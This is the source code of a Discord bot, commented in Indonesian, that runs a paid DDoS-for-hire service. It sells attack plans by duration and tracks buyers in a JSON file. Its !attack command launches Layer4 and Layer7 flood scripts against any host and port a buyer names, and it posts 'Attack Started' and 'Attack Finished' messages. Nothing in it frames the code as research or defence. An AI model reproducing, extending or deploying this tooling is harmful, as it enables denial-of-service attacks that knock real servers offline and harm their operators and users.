require("dotenv").config();
const { Client, GatewayIntentBits, EmbedBuilder } = require("discord.js");
const fs = require("fs");
const { spawn } = require("child_process");
const path = require("path");

const OWNER_ID = process.env.OWNER_ID; // isi ID owner bot di file .env

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

// ===============================
// Buyers system
// ===============================
let buyers = [];
try {
  if (fs.existsSync("buyers.json")) {
    buyers = JSON.parse(fs.readFileSync("buyers.json", "utf8"));
  }
} catch (err) {
  console.error("❌ Gagal load buyers.json:", err);
  buyers = [];
}

function saveBuyers() {
  fs.writeFileSync("buyers.json", JSON.stringify(buyers, null, 2));
}

const plans = {
  low: { name: "Low", max: 120 },
  medium: { name: "Medium", max: 300 },
  high: { name: "High", max: 1000 }
};

function cleanupExpiredBuyers() {
  const now = new Date();
  buyers = buyers.filter((b) => new Date(b.expires) >= now);
  saveBuyers();
}

// ===============================
// Bot ready
// ===============================
client.once("ready", () => {
  console.log(`✅ Bot login sebagai ${client.user.tag}`);
  cleanupExpiredBuyers();
});

// ===============================
// Message handler
// ===============================
client.on("messageCreate", async (message) => {
  if (message.author.bot) return;

  cleanupExpiredBuyers();

  const args = message.content.trim().split(/\s+/);
  const command = args.shift()?.toLowerCase();

  // =====================================
  // !help
  // =====================================
  if (command === "!help") {
    let description = "**📖 ALL USER COMMANDS**\n";
    description += "```\n";
    description += "!help      → Menampilkan daftar command\n";
    description += "!methods   → Menampilkan methods yang tersedia\n";
    description += "!attack    → Menjalankan attack\n";
    description += "!botinfo   → Info bot\n";
    description += "!buy       → Lihat paket plans\n";
    description += "```\n";

    if (message.author.id === OWNER_ID) {
      description += "\n**🛠️ OWNER COMMANDS**\n";
      description += "```\n";
      description += "!addbuyers <userId> <expire> <plan>   → Tambah buyer\n";
      description += "!deletebuyers <userId>                → Hapus buyer\n";
      description += "```\n";
    }

    const helpEmbed = new EmbedBuilder()
      .setColor(0x0099ff)
      .setTitle("⚡ Bot Command List")
      .setDescription(description)
      .setFooter({ text: "Bot Discord by GadaLuBau" })
      .setTimestamp();

    return message.channel.send({ embeds: [helpEmbed] });
  }

  // =====================================
  // !methods
  // =====================================
  if (command === "!methods") {
    let methodsList = { Layer4: [], Layer7: [] };

    try {
      const layer4Files = fs.readdirSync(path.join(__dirname, "src", "layer4"));
      layer4Files.forEach((file) => {
        const ext = path.extname(file);
        const base = path.basename(file, ext);
        if ([".js", ".py", ".go"].includes(ext)) {
          if (!methodsList.Layer4.includes(base)) methodsList.Layer4.push(base);
        }
      });

      const layer7Files = fs.readdirSync(path.join(__dirname, "src", "layer7"));
      layer7Files.forEach((file) => {
        const ext = path.extname(file);
        const base = path.basename(file, ext);
        if ([".js", ".py", ".go"].includes(ext)) {
          if (!methodsList.Layer7.includes(base)) methodsList.Layer7.push(base);
        }
      });
    } catch (err) {
      console.error("❌ Error membaca folder src:", err);
    }

    const methodsEmbed = new EmbedBuilder()
      .setColor(0x00ffcc)
      .setTitle("⚔️ Methods Available")
      .setDescription("List methods otomatis dari folder `src/layer4` dan `src/layer7`:")
      .addFields(
        { name: "🌐 Layer7", value: methodsList.Layer7.length ? methodsList.Layer7.join(", ") : "Tidak ada" },
        { name: "📡 Layer4", value: methodsList.Layer4.length ? methodsList.Layer4.join(", ") : "Tidak ada" }
      )
      .setTimestamp();

    return message.channel.send({ embeds: [methodsEmbed] });
  }

  // =====================================
  // !botinfo
  // =====================================
  if (command === "!botinfo") {
    function formatDuration(ms) {
      const sec = Math.floor(ms / 1000);
      const d = Math.floor(sec / (3600 * 24));
      const h = Math.floor((sec % (3600 * 24)) / 3600);
      const m = Math.floor((sec % 3600) / 60);
      const s = sec % 60;

      let parts = [];
      if (d > 0) parts.push(`${d}d`);
      if (h > 0) parts.push(`${h}h`);
      if (m > 0) parts.push(`${m}m`);
      if (s > 0) parts.push(`${s}s`);
      return parts.join(" ");
    }

    const uptime = formatDuration(client.uptime);

    const botEmbed = new EmbedBuilder()
      .setColor(0xffff00)
      .setTitle("🤖 Bot Information")
      .addFields(
        { name: "Bot Name", value: client.user.username, inline: true },
        { name: "Created By", value: "GadaLuBau", inline: true },
        { name: "Server Count", value: `${client.guilds.cache.size}`, inline: true },
        { name: "Uptime", value: uptime, inline: true }
      )
      .setTimestamp();

    return message.channel.send({ embeds: [botEmbed] });
  }

  // =====================================
  // !buy
  // =====================================
  if (command === "!buy") {
    const buyEmbed = new EmbedBuilder()
      .setColor(0x33cc33)
      .setTitle("💳 Plans")
      .addFields(
        { name: "Low", value: "All methods, max attack 120 detik" },
        { name: "Medium", value: "All methods, max attack 300 detik" },
        { name: "High", value: "All methods, max attack 1000 detik" }
      )
      .setTimestamp();

    return message.channel.send({ embeds: [buyEmbed] });
  }

  // =====================================
  // !addbuyers
  // =====================================
  if (command === "!addbuyers") {
    if (message.author.id !== OWNER_ID) {
      return message.reply("❌ Hanya owner yang bisa menambahkan buyers.");
    }

    if (args.length < 3) {
      return message.reply("❌ Format: `!addbuyers <userId> <expire(YYYY-MM-DD)> <plan>`");
    }

    const [user, expires, plan] = args;
    if (!plans[plan]) return message.reply("❌ Plan tidak valid.");

    const cleanUser = user.replace(/[<@!>]/g, "");
    buyers.push({ user: cleanUser, expires, plan });
    saveBuyers();

    const addEmbed = new EmbedBuilder()
      .setColor(0x00ff00)
      .setTitle("✅ Buyer Added")
      .setDescription(
        `User <@${cleanUser}> berhasil ditambahkan.\nPlan: **${plan}**, Expired: **${expires}**`
      );

    return message.channel.send({ embeds: [addEmbed] });
  }

  // =====================================
  // !deletebuyers
  // =====================================
  if (command === "!deletebuyers") {
    if (message.author.id !== OWNER_ID) {
      return message.reply("❌ Hanya owner yang bisa menghapus buyers.");
    }

    if (args.length < 1) {
      return message.reply("❌ Format: `!deletebuyers <userId>`");
    }

    const cleanUser = args[0].replace(/[<@!>]/g, "");
    buyers = buyers.filter((b) => b.user !== cleanUser);
    saveBuyers();

    const delEmbed = new EmbedBuilder()
      .setColor(0xff0000)
      .setTitle("🗑️ Buyer Removed")
      .setDescription(`User <@${cleanUser}> telah dihapus.`);

    return message.channel.send({ embeds: [delEmbed] });
  }

  // =====================================
  // !attack
  // =====================================
  if (command === "!attack") {
    if (args.length < 4) {
      return message.reply("❌ Format: `!attack <host/ip> <port> <method> <time>`");
    }

    const buyer = buyers.find((b) => String(b.user) === message.author.id);
    if (!buyer) {
      return message.reply("❌ Kamu bukan buyers, cek `!buy` untuk info.");
    }

    const [host, port, method, timeStr] = args;
    const plan = plans[buyer.plan];
    const time = parseInt(timeStr);

    if (!plan) return message.reply("❌ Plan tidak valid.");
    if (time > plan.max) {
      return message.reply(`❌ Plan ${plan.name} hanya max **${plan.max} detik**.`);
    }

    let scriptFile = null;
    let cmd = null;
    let runArgs = [];

    // cek layer4
    const methodPathL4 = path.join(__dirname, "src", "layer4", method);
    const methodPathL7 = path.join(__dirname, "src", "layer7", method);

    if (fs.existsSync(`${methodPathL4}.js`)) {
      scriptFile = `${methodPathL4}.js`;
      cmd = "node";
      runArgs = [scriptFile, host, port, time];
    } else if (fs.existsSync(`${methodPathL4}.py`)) {
      scriptFile = `${methodPathL4}.py`;
      cmd = "python3";
      runArgs = [scriptFile, host, port, time];
    } else if (fs.existsSync(`${methodPathL4}.go`)) {
      scriptFile = `${methodPathL4}.go`;
      cmd = "go";
      runArgs = ["run", scriptFile, host, port, time];
    } else if (fs.existsSync(`${methodPathL7}.js`)) {
      scriptFile = `${methodPathL7}.js`;
      cmd = "node";
      runArgs = [scriptFile, host, port, time];
    } else if (fs.existsSync(`${methodPathL7}.py`)) {
      scriptFile = `${methodPathL7}.py`;
      cmd = "python3";
      runArgs = [scriptFile, host, port, time];
    } else if (fs.existsSync(`${methodPathL7}.go`)) {
      scriptFile = `${methodPathL7}.go`;
      cmd = "go";
      runArgs = ["run", scriptFile, host, port, time];
    }

    if (!scriptFile) {
      return message.reply(`❌ Tidak ada file untuk method \`${method}\` di layer4/layer7.`);
    }

    const attackProcess = spawn(cmd, runArgs);
    console.log(`🚀 Menjalankan ${cmd} ${runArgs.join(" ")}`);

    attackProcess.stdout.on("data", (data) => {
      console.log(`[${method.toUpperCase()} STDOUT] ${data}`);
    });

    attackProcess.stderr.on("data", (data) => {
      console.error(`[${method.toUpperCase()} ERROR] ${data}`);
    });

    const attackEmbed = new EmbedBuilder()
      .setColor(0xff0000)
      .setTitle("🚀 Attack Started")
      .addFields(
        { name: "🎯 Target", value: host, inline: true },
        { name: "🔌 Port", value: port, inline: true },
        { name: "⚔️ Method", value: method, inline: true },
        { name: "⏳ Duration", value: `${time} detik`, inline: true },
        { name: "📦 Plan", value: `${plan.name}`, inline: true }
      )
      .setFooter({ text: `Requested by ${message.author.tag}` })
      .setTimestamp();

    await message.channel.send({ embeds: [attackEmbed] });

    setTimeout(() => {
      try {
        attackProcess.kill("SIGKILL");
      } catch (err) {
        console.error("❌ Gagal stop process:", err);
      }

      const doneEmbed = new EmbedBuilder()
        .setColor(0x00cc66)
        .setTitle("✅ Attack Finished")
        .setDescription(
          `Attack ke **${host}:${port}** dengan **${method}** selesai setelah **${time} detik**.`
        )
        .setFooter({ text: `Requested by ${message.author.tag}` })
        .setTimestamp();

      message.channel.send({ embeds: [doneEmbed] });
    }, time * 1000);
  }
});

client.login(process.env.DISCORD_TOKEN);
